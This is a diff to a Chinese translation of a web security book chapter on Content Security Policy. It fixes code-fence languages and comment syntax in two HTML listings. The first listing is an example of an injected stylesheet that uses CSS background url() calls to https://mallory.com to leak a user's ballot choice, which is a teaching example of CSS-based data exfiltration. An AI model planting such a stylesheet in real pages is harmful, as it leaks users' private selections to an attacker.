@@ -141,15 +141,15 @@ Mallory 的样式表动态设置了 Alice 所选选项的背景。这个事件�
 
 列表 15.1 Mallory 在 Alice 的浏览器中注入恶意样式表
 
-```py
+```html
 <html>
 
-    <style>                                                    # ❶
-        option[value=bob]:checked {                            # ❷
-            background: url(https://mallory.com/?vote=bob);    # ❸
+    <style>                                                    /* ❶ */
+        option[value=bob]:checked {                            /* ❷ */
+            background: url(https://mallory.com/?vote=bob);    /* ❸ */
         }
-        option[value=eve]:checked {                            # ❹
-            background: url(https://mallory.com/?vote=eve);    # ❺
+        option[value=eve]:checked {                            /* ❹ */
+            background: url(https://mallory.com/?vote=eve);    /* ❺ */
         }
     </style>
 
@@ -157,8 +157,8 @@ Mallory 的样式表动态设置了 Alice 所选选项的背景。这个事件�
         ...
         <select id="ballot">
             <option>Cast your vote!</option>
-            <option value="bob">Bob</option>                   # ❻
-            <option value="eve">Eve</option>                   # ❻
+            <option value="bob">Bob</option>                   <!-- ❻ -->
+            <option value="eve">Eve</option>                   <!-- ❻ -->
         </select>
         ...
     </body>
@@ -349,16 +349,16 @@ CSP_FRAME_ANCESTORS = ("'none'", )
 
 显示 15.2 网页嵌入了来自谷歌的样式表和字体
 
-```py
+```html
 <html>
   <head>
-    <link href='https://fonts.googleapis.com/css?family=Caveat'    # ❶
-          rel='stylesheet'>                                        # ❶
-    <style nonce="{{request.csp_nonce}}">                          # ❷
-      body {                                                       # ❷
-        font-family: 'Caveat', serif;                              # ❷
-      }                                                            # ❷
-    </style>                                                       # ❷
+    <link href='https://fonts.googleapis.com/css?family=Caveat'    <!-- ❶ -->
+          rel='stylesheet'>                                        <!-- ❶ -->
+    <style nonce="{{request.csp_nonce}}">                          /*   ❷  */
+      body {                                                       /*   ❷  */
+        font-family: 'Caveat', serif;                              /*   ❷  */
+      }                                                            /*   ❷  */
+    </style>                                                       <!-- ❷ -->
   </head>
     <body>
       Text displayed in Caveat font
